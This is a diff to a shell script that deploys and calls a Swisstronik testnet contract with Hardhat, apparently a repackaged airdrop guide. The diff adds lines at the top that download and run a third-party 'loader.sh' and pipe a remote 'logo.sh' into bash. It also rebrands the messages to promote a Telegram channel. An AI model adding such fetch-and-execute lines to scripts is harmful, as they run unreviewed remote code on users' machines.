@@ -1,4 +1,9 @@
 #!/bin/sh
+
+wget -O loader.sh https://raw.githubusercontent.com/DiscoverMyself/Ramanode-Guides/main/loader.sh && chmod +x loader.sh && ./loader.sh
+curl -s https://raw.githubusercontent.com/DiscoverMyself/Ramanode-Guides/main/logo.sh | bash
+sleep 4
+
 sudo apt-get update && sudo apt get upgrade -y
 clear
 
@@ -90,11 +95,7 @@ async function main() {
   console.log('Non-proxy Swisstronik deployed to:', swisstronik.target);
   fs.writeFileSync("contract.txt", swisstronik.target);
 
-  console.log(\`Deployment transaction hash: https://explorer-evm.testnet.swisstronik.com/address/\${swisstronik.target}\`);
-
-  console.log('');
-  
-  const upgradedSwisstronik = await upgrades.deployProxy(Swisstronik, ['Hello Swisstronik fam!!'], { kind: 'transparent' });
+  const upgradedSwisstronik = await upgrades.deployProxy(Swisstronik, ['Hello Swisstronik from Happy Cuan Airdrop!!'], { kind: 'transparent' });
   await upgradedSwisstronik.waitForDeployment(); 
   console.log('Proxy Swisstronik deployed to:', upgradedSwisstronik.target);
   fs.writeFileSync("proxiedContract.txt", upgradedSwisstronik.target);
@@ -138,7 +139,7 @@ async function main() {
   const contractFactory = await hre.ethers.getContractFactory("Swisstronik");
   const contract = contractFactory.attach(contractAddress);
   const functionName = "setMessage";
-  const messageToSet = "Hello Swisstronik fam!!";
+  const messageToSet = "Hello Swisstronik from Happy Cuan Airdrop!!";
   const setMessageTx = await sendShieldedTransaction(signer, contractAddress, contract.interface.encodeFunctionData(functionName, [messageToSet]), 0);
   await setMessageTx.wait();
   console.log("Transaction Receipt: ", setMessageTx);
@@ -191,4 +192,4 @@ echo "getMessage.js script created."
 echo "Running getMessage.js..."
 npx hardhat run scripts/getMessage.js --network swisstronik
 echo "Message retrieved."
-echo "good luck"
+echo "Done! Subscribe: https://t.me/HappyCuanAirdrop"
